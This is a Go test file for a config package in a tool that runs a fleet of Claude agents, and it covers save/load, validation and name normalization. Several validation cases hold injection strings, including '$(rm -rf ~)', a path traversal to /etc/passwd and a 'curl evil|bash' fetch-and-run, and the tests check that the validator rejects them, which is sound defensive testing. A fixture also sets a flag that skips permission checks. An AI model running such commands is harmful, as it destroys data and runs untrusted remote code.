package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestSaveAndLoad(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "test.toml")

	cfg := &FleetConfig{
		Project: ProjectConfig{
			Name:     "test-project",
			RelayURL: "http://localhost:8090/mcp",
			Cwd:      "/tmp/test",
		},
		Claude: ClaudeConfig{
			Flags: []string{"--dangerously-skip-permissions"},
		},
		Agents: []AgentConfig{
			{
				Name:        "boss",
				Color:       "green",
				Role:        "Project lead",
				IsExecutive: true,
			},
			{
				Name:      "worker",
				Color:     "blue",
				Role:      "Developer",
				ReportsTo: "boss",
			},
		},
	}

	if err := Save(path, cfg); err != nil {
		t.Fatalf("Save failed: %v", err)
	}

	loaded, err := Load(path)
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}

	if loaded.Project.Name != cfg.Project.Name {
		t.Errorf("project name: got %q, want %q", loaded.Project.Name, cfg.Project.Name)
	}
	if len(loaded.Agents) != 2 {
		t.Fatalf("agents count: got %d, want 2", len(loaded.Agents))
	}
	if loaded.Agents[1].ReportsTo != "boss" {
		t.Errorf("reports_to: got %q, want %q", loaded.Agents[1].ReportsTo, "boss")
	}
}

func TestValidate(t *testing.T) {
	tests := []struct {
		name    string
		cfg     FleetConfig
		wantErr string
	}{
		{
			name: "valid config",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "my-project", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "Developer"}},
			},
			wantErr: "",
		},
		{
			name: "empty project name",
			cfg: FleetConfig{
				Project: ProjectConfig{Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "Dev"}},
			},
			wantErr: "project name is required",
		},
		{
			name: "invalid agent name",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "test", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "bad agent!", Color: "green", Role: "Dev"}},
			},
			wantErr: "invalid agent name",
		},
		{
			name: "invalid color",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "test", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "dev", Color: "rainbow", Role: "Dev"}},
			},
			wantErr: "invalid color",
		},
		{
			name: "duplicate agent names",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "test", Cwd: "/tmp"},
				Agents: []AgentConfig{
					{Name: "dev", Color: "green", Role: "Dev"},
					{Name: "dev", Color: "blue", Role: "Dev2"},
				},
			},
			wantErr: "duplicate agent name",
		},
		{
			name: "no agents",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "test", Cwd: "/tmp"},
			},
			wantErr: "at least one agent is required",
		},
		{
			name: "project name with shell metacharacters (command injection)",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "$(rm -rf ~)", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "Dev"}},
			},
			wantErr: "invalid project name",
		},
		{
			name: "project name path traversal",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "../../etc/passwd", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "Dev"}},
			},
			wantErr: "invalid project name",
		},
		{
			name: "role with shell injection",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "proj", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "x'; curl evil|bash; '"}},
			},
			wantErr: "invalid role",
		},
		{
			name: "role with slash is allowed (CI/CD)",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "proj", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "ops", Color: "green", Role: "CI/CD and deployment"}},
			},
			wantErr: "",
		},
		{
			name: "real french role with em-dash and ampersand is allowed",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "proj", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "nazaire", Color: "green", Role: "Executive — project owner, strategy & architecture decisions"}},
			},
			wantErr: "",
		},
		{
			name: "role with accents is allowed",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "proj", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "Développeur généraliste bot météo Polymarket"}},
			},
			wantErr: "",
		},
		{
			name: "role with command substitution is rejected",
			cfg: FleetConfig{
				Project: ProjectConfig{Name: "proj", Cwd: "/tmp"},
				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "x $(whoami)"}},
			},
			wantErr: "invalid role",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.cfg.Validate()
			if tt.wantErr == "" {
				if err != nil {
					t.Errorf("expected no error, got: %v", err)
				}
			} else {
				if err == nil {
					t.Errorf("expected error containing %q, got nil", tt.wantErr)
				} else if !strings.Contains(err.Error(), tt.wantErr) {
					t.Errorf("expected error containing %q, got: %v", tt.wantErr, err)
				}
			}
		})
	}
}

func TestNormalizeProjectName(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{"site.com", "site-com"},
		{"My App", "My-App"},
		{"clean-name_1", "clean-name_1"},
		{"weird$(x)", "weird--x"},
		{"_leading", "leading"},
		{"trailing-", "trailing"},
	}
	for _, tc := range tests {
		got := NormalizeProjectName(tc.in)
		if got != tc.want {
			t.Errorf("NormalizeProjectName(%q) = %q, want %q", tc.in, got, tc.want)
		}
		// A normalized name must always satisfy the Validate() guard.
		if got != "" && !validName.MatchString(got) {
			t.Errorf("NormalizeProjectName(%q) = %q which fails validName", tc.in, got)
		}
	}
}

func TestAutoTalkBackwardCompat(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "old.toml")

	oldTOML := `[project]
name = "legacy"
relay_url = "http://localhost:8090/mcp"
cwd = "/tmp"

[[agents]]
name = "dev"
color = "green"
role = "Developer"
`
	os.WriteFile(path, []byte(oldTOML), 0644)

	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if cfg.Agents[0].AutoTalk {
		t.Error("expected AutoTalk to default to false for old configs")
	}
}

func TestAutoTalkRoundTrip(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "test.toml")

	cfg := &FleetConfig{
		Project: ProjectConfig{Name: "test", Cwd: "/tmp"},
		Agents: []AgentConfig{
			{Name: "boss", Color: "green", Role: "Lead", IsExecutive: true, AutoTalk: true},
			{Name: "worker", Color: "blue", Role: "Dev"},
		},
	}
	Save(path, cfg)
	loaded, err := Load(path)
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if !loaded.Agents[0].AutoTalk {
		t.Error("expected boss AutoTalk=true")
	}
	if loaded.Agents[1].AutoTalk {
		t.Error("expected worker AutoTalk=false")
	}
}

func TestLoadLastSymlink(t *testing.T) {
	dir := t.TempDir()
	configDir := filepath.Join(dir, "configs")
	os.MkdirAll(configDir, 0755)

	cfg := &FleetConfig{
		Project: ProjectConfig{Name: "my-project"},
	}

	configPath := filepath.Join(configDir, "my-project.toml")
	Save(configPath, cfg)

	lastPath := filepath.Join(dir, "last.toml")
	os.Symlink(configPath, lastPath)

	loaded, err := Load(lastPath)
	if err != nil {
		t.Fatalf("Load via symlink failed: %v", err)
	}
	if loaded.Project.Name != "my-project" {
		t.Errorf("got %q, want %q", loaded.Project.Name, "my-project")
	}
}

func TestResolveClaudeBin(t *testing.T) {
	// explicit existing path is returned as-is
	dir := t.TempDir()
	fake := filepath.Join(dir, "myclaude")
	if err := os.WriteFile(fake, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	got, err := ClaudeConfig{Bin: fake}.ResolveBin()
	if err != nil {
		t.Fatalf("explicit path: %v", err)
	}
	if got != fake {
		t.Errorf("explicit path: got %q, want %q", got, fake)
	}

	// explicit missing path errors (does not silently fall back to PATH)
	if _, err := (ClaudeConfig{Bin: filepath.Join(dir, "nope")}).ResolveBin(); err == nil {
		t.Error("expected error for missing explicit path")
	}

	// empty Bin resolves "claude" from PATH to an absolute path
	pdir := t.TempDir()
	onPath := filepath.Join(pdir, "claude")
	if err := os.WriteFile(onPath, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", pdir)
	got, err = ClaudeConfig{}.ResolveBin()
	if err != nil {
		t.Fatalf("PATH lookup: %v", err)
	}
	if got != onPath {
		t.Errorf("PATH lookup: got %q, want %q", got, onPath)
	}

	// empty Bin + claude not on PATH errors with a clear message
	t.Setenv("PATH", t.TempDir())
	if _, err := (ClaudeConfig{}).ResolveBin(); err == nil {
		t.Error("expected error when claude is not on PATH")
	}
}
